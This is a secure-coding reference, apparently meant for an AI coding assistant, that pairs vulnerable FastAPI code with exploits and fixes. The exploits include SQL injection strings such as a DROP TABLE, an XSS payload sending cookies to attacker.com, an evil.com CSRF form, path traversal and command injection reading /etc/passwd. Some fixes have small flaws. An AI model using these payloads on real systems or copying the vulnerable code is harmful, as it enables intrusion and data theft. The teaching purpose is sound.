# Vulnerability Examples Reference

Load this file when fixing security vulnerabilities or learning secure coding patterns. Each example shows: vulnerable code → exploit → secure fix.

---

## SQL Injection

### Example 1: String Concatenation

**Vulnerable Code:**
```python
@router.get("/users")
def search_users(name: str):
    # VULNERABLE: User input directly in query
    query = f"SELECT * FROM users WHERE name = '{name}'"
    result = db.execute(query)
    return result.fetchall()
```

**Exploit:**
```bash
# Attacker sends: ?name=' OR '1'='1
# Resulting query: SELECT * FROM users WHERE name = '' OR '1'='1'
# Returns ALL users (authentication bypass)

# Attacker sends: ?name='; DROP TABLE users; --
# Executes: DROP TABLE users
# Database destroyed
```

**Secure Fix:**
```python
@router.get("/users")
def search_users(name: str, db: Session = Depends(get_db)):
    # SECURE: Parameterized query with SQLAlchemy ORM
    users = db.query(User).filter(User.name == name).all()
    return users

# Alternative: Raw query with parameters
# result = db.execute(
#     text("SELECT * FROM users WHERE name = :name"),
#     {"name": name}
# )
```

### Example 2: Dynamic Table Names

**Vulnerable Code:**
```python
def get_records(table_name: str):
    # VULNERABLE: Table name from user input
    query = f"SELECT * FROM {table_name}"
    return db.execute(query).fetchall()
```

**Exploit:**
```bash
# Attacker sends: table_name=users UNION SELECT password FROM admin_users
# Exfiltrates admin passwords
```

**Secure Fix:**
```python
# Define allowed tables
ALLOWED_TABLES = {"users", "products", "orders"}

def get_records(table_name: str):
    # Whitelist validation
    if table_name not in ALLOWED_TABLES:
        raise ValueError("Invalid table name")

    # Use SQLAlchemy Table objects (not string concatenation)
    from sqlalchemy import Table, MetaData
    metadata = MetaData()
    table = Table(table_name, metadata, autoload_with=engine)
    return db.query(table).all()
```

---

## Cross-Site Scripting (XSS)

### Example 1: Reflected XSS

**Vulnerable Code:**
```python
# routes.py
@router.get("/search")
def search(query: str, request: Request):
    return templates.TemplateResponse("search.html", {
        "request": request,
        "query": query,  # VULNERABLE: Unescaped output
        "results": search_db(query)
    })
```

```html
<!-- templates/search.html -->
<h1>Search Results for: {{ query | safe }}</h1>
<!-- VULNERABLE: | safe disables auto-escaping -->
```

**Exploit:**
```bash
# Attacker sends: ?query=<script>alert(document.cookie)</script>
# Browser executes JavaScript, steals session cookie
```

**Secure Fix:**
```python
# routes.py - no changes needed
@router.get("/search")
def search(query: str, request: Request):
    return templates.TemplateResponse("search.html", {
        "request": request,
        "query": query,  # Will be auto-escaped
        "results": search_db(query)
    })
```

```html
<!-- templates/search.html -->
<h1>Search Results for: {{ query }}</h1>
<!-- SECURE: Auto-escaped by default -->
<!-- <script> becomes &lt;script&gt; -->
```

### Example 2: Stored XSS

**Vulnerable Code:**
```python
@router.post("/comments")
def create_comment(content: str, user: User = Depends(get_current_user)):
    # No input validation or sanitization
    comment = Comment(content=content, user_id=user.id)
    db.add(comment)
    db.commit()
    return comment
```

```html
<!-- Display comments -->
{% for comment in comments %}
    <div>{{ comment.content | safe }}</div>
    <!-- VULNERABLE: Allows HTML/JS in comments -->
{% endfor %}
```

**Exploit:**
```bash
# Attacker posts: <img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
# Every user viewing comments has their session stolen
```

**Secure Fix:**
```python
import bleach

ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'a']
ALLOWED_ATTRS = {'a': ['href', 'title']}

@router.post("/comments")
def create_comment(content: str, user: User = Depends(get_current_user)):
    # Sanitize HTML input
    clean_content = bleach.clean(
        content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True
    )

    comment = Comment(content=clean_content, user_id=user.id)
    db.add(comment)
    db.commit()
    return comment
```

```html
<!-- Display comments - now safe -->
{% for comment in comments %}
    <div>{{ comment.content | safe }}</div>
    <!-- SECURE: Content already sanitized server-side -->
{% endfor %}
```

---

## Cross-Site Request Forgery (CSRF)

### Example 1: Missing CSRF Protection

**Vulnerable Code:**
```python
@router.post("/transfer")
def transfer_money(to_user: int, amount: float, user: User = Depends(get_current_user)):
    # VULNERABLE: No CSRF token validation
    transfer = Transfer(from_user=user.id, to_user=to_user, amount=amount)
    db.add(transfer)
    db.commit()
    return {"status": "success"}
```

```html
<!-- transfer.html -->
<form method="POST" action="/transfer">
    <input name="to_user" value="">
    <input name="amount" value="">
    <button>Send Money</button>
    <!-- VULNERABLE: No CSRF token -->
</form>
```

**Exploit:**
```html
<!-- Attacker's website: evil.com -->
<form id="csrf" method="POST" action="https://bank.com/transfer">
    <input name="to_user" value="999">  <!-- Attacker's account -->
    <input name="amount" value="10000">
</form>
<script>
    document.getElementById('csrf').submit();
    // Automatically submits when victim visits page
</script>
```

**Secure Fix:**
```python
from fastapi_csrf_protect import CsrfProtect

@router.post("/transfer")
def transfer_money(
    to_user: int,
    amount: float,
    csrf_protect: CsrfProtect = Depends(),
    user: User = Depends(get_current_user)
):
    # SECURE: Validate CSRF token
    csrf_protect.validate_csrf(request)

    transfer = Transfer(from_user=user.id, to_user=to_user, amount=amount)
    db.add(transfer)
    db.commit()
    return {"status": "success"}
```

```html
<!-- transfer.html -->
<form method="POST" action="/transfer">
    <!-- SECURE: CSRF token included -->
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input name="to_user" value="">
    <input name="amount" value="">
    <button>Send Money</button>
</form>
```

---

## Insecure Direct Object Reference (IDOR)

### Example 1: Missing Authorization Check

**Vulnerable Code:**
```python
@router.get("/documents/{doc_id}")
def get_document(doc_id: int, db: Session = Depends(get_db)):
    # VULNERABLE: No ownership check
    document = db.query(Document).filter(Document.id == doc_id).first()
    if not document:
        raise HTTPException(404)
    return document
```

**Exploit:**
```bash
# User A's document: /documents/123
# Attacker tries: /documents/124, /documents/125, ...
# Accesses other users' documents by guessing IDs
```

**Secure Fix:**
```python
@router.get("/documents/{doc_id}")
def get_document(
    doc_id: int,
    db: Session = Depends(get_db),
    user: User = Depends(get_current_user)
):
    # SECURE: Check ownership
    document = db.query(Document).filter(
        Document.id == doc_id,
        Document.user_id == user.id  # Only return if owned by current user
    ).first()

    if not document:
        raise HTTPException(404, "Document not found or access denied")

    return document
```

### Example 2: Mass Assignment

**Vulnerable Code:**
```python
@router.put("/users/{user_id}")
def update_user(user_id: int, request: Request, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.id == user_id).first()

    # VULNERABLE: Updates ALL fields from request
    for key, value in request.json().items():
        setattr(user, key, value)

    db.commit()
    return user
```

**Exploit:**
```bash
# Attacker sends:
{
    "name": "John",
    "role": "ADMIN"  # Escalates to admin
}
```

**Secure Fix:**
```python
from pydantic import BaseModel

class UserUpdate(BaseModel):
    name: str | None = None
    email: str | None = None
    # role NOT included - can't be updated by users

    class Config:
        extra = "forbid"  # Reject unknown fields

@router.put("/users/{user_id}")
def update_user(
    user_id: int,
    update_data: UserUpdate,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    # Check authorization
    if user_id != current_user.id and current_user.role != UserRole.ADMIN:
        raise HTTPException(403, "Access denied")

    user = db.query(User).filter(User.id == user_id).first()

    # SECURE: Only update allowed fields
    if update_data.name is not None:
        user.name = update_data.name
    if update_data.email is not None:
        user.email = update_data.email

    db.commit()
    return user
```

---

## Path Traversal

### Example 1: File Download

**Vulnerable Code:**
```python
@router.get("/download")
def download_file(filename: str):
    # VULNERABLE: User controls file path
    file_path = f"uploads/{filename}"
    return FileResponse(file_path)
```

**Exploit:**
```bash
# Attacker sends: ?filename=../../etc/passwd
# Resulting path: uploads/../../etc/passwd → /etc/passwd
# Downloads system files
```

**Secure Fix:**
```python
import os
from pathlib import Path

UPLOAD_DIR = Path("uploads").resolve()

@router.get("/download")
def download_file(filename: str):
    # SECURE: Validate and sanitize path
    # Remove directory separators
    safe_filename = os.path.basename(filename)

    # Construct full path
    file_path = (UPLOAD_DIR / safe_filename).resolve()

    # Ensure path is within UPLOAD_DIR (prevent traversal)
    if not str(file_path).startswith(str(UPLOAD_DIR)):
        raise HTTPException(400, "Invalid filename")

    # Check file exists
    if not file_path.exists():
        raise HTTPException(404)

    return FileResponse(file_path)
```

---

## Command Injection

### Example 1: Shell Command Execution

**Vulnerable Code:**
```python
import subprocess

@router.post("/ping")
def ping_host(hostname: str):
    # VULNERABLE: User input in shell command
    result = subprocess.run(
        f"ping -c 4 {hostname}",
        shell=True,  # DANGEROUS
        capture_output=True,
        text=True
    )
    return {"output": result.stdout}
```

**Exploit:**
```bash
# Attacker sends: hostname=8.8.8.8; cat /etc/passwd
# Executes: ping -c 4 8.8.8.8; cat /etc/passwd
# Exfiltrates password file
```

**Secure Fix:**
```python
import subprocess
import re

@router.post("/ping")
def ping_host(hostname: str):
    # SECURE: Validate input format
    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
        raise HTTPException(400, "Invalid hostname format")

    # Use list arguments (not shell=True)
    result = subprocess.run(
        ["ping", "-c", "4", hostname],
        shell=False,  # SAFE: No shell interpretation
        capture_output=True,
        text=True,
        timeout=10
    )
    return {"output": result.stdout}
```

---

## Insecure File Upload

### Example 1: Unrestricted File Upload

**Vulnerable Code:**
```python
@router.post("/upload")
async def upload_file(file: UploadFile):
    # VULNERABLE: No validation
    file_path = f"uploads/{file.filename}"

    with open(file_path, "wb") as f:
        f.write(await file.read())

    return {"filename": file.filename}
```

**Exploit:**
```bash
# Attacker uploads: malicious.php
# If web server executes PHP, remote code execution
# Or uploads: ../../../etc/crontab (path traversal)
```

**Secure Fix:**
```python
import uuid
from pathlib import Path

ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".pdf", ".txt"}
ALLOWED_MIME_TYPES = {
    "image/jpeg", "image/png", "application/pdf", "text/plain"
}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

@router.post("/upload")
async def upload_file(
    file: UploadFile,
    user: User = Depends(get_current_user)
):
    # 1. Validate MIME type
    if file.content_type not in ALLOWED_MIME_TYPES:
        raise HTTPException(400, "File type not allowed")

    # 2. Validate extension
    file_ext = Path(file.filename).suffix.lower()
    if file_ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(400, "File extension not allowed")

    # 3. Check file size
    contents = await file.read()
    if len(contents) > MAX_FILE_SIZE:
        raise HTTPException(400, "File too large")

    # 4. Generate safe filename (UUID)
    safe_filename = f"{uuid.uuid4()}{file_ext}"
    file_path = Path("uploads") / safe_filename

    # 5. Save file
    with open(file_path, "wb") as f:
        f.write(contents)

    # 6. Store metadata in database
    upload = FileUpload(
        original_filename=file.filename,
        stored_filename=safe_filename,
        user_id=user.id,
        mime_type=file.content_type,
        size=len(contents)
    )
    db.add(upload)
    db.commit()

    return {"file_id": upload.id}
```

---

## Broken Authentication

### Example 1: Weak Password Requirements

**Vulnerable Code:**
```python
@router.post("/register")
def register(username: str, password: str):
    # VULNERABLE: No password validation
    hashed = hash_password(password)
    user = User(username=username, password=hashed)
    db.add(user)
    db.commit()
    return user
```

**Exploit:**
```bash
# Attacker registers with: password="1"
# Trivially brute-forced
```

**Secure Fix:**
```python
import re
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def validate_password(password: str) -> tuple[bool, str]:
    """Validate password strength."""
    if len(password) < 12:
        return False, "Password must be at least 12 characters"
    if not re.search(r'[A-Z]', password):
        return False, "Password must contain uppercase letter"
    if not re.search(r'[a-z]', password):
        return False, "Password must contain lowercase letter"
    if not re.search(r'[0-9]', password):
        return False, "Password must contain number"
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        return False, "Password must contain special character"
    return True, ""

@router.post("/register")
def register(username: str, password: str):
    # SECURE: Validate password strength
    valid, error_msg = validate_password(password)
    if not valid:
        raise HTTPException(400, error_msg)

    # Use strong hashing (bcrypt with work factor)
    hashed = pwd_context.hash(password)

    user = User(username=username, password=hashed)
    db.add(user)
    db.commit()
    return user
```

---

## Security Headers

### Missing Security Headers

**Vulnerable Code:**
```python
from fastapi import FastAPI

app = FastAPI()
# VULNERABLE: No security headers
```

**Exploit:**
- Clickjacking attacks (missing X-Frame-Options)
- MIME sniffing attacks (missing X-Content-Type-Options)
- XSS attacks (missing Content-Security-Policy)

**Secure Fix:**
```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)

        # Prevent clickjacking
        response.headers["X-Frame-Options"] = "DENY"

        # Prevent MIME sniffing
        response.headers["X-Content-Type-Options"] = "nosniff"

        # XSS protection (legacy, but doesn't hurt)
        response.headers["X-XSS-Protection"] = "1; mode=block"

        # Content Security Policy
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:; "
            "font-src 'self'; "
            "connect-src 'self'; "
            "frame-ancestors 'none'"
        )

        # HTTPS enforcement (if using HTTPS)
        if request.url.scheme == "https":
            response.headers["Strict-Transport-Security"] = (
                "max-age=31536000; includeSubDomains"
            )

        return response

app = FastAPI()
app.add_middleware(SecurityHeadersMiddleware)
```

---

*End of Vulnerability Examples Reference*
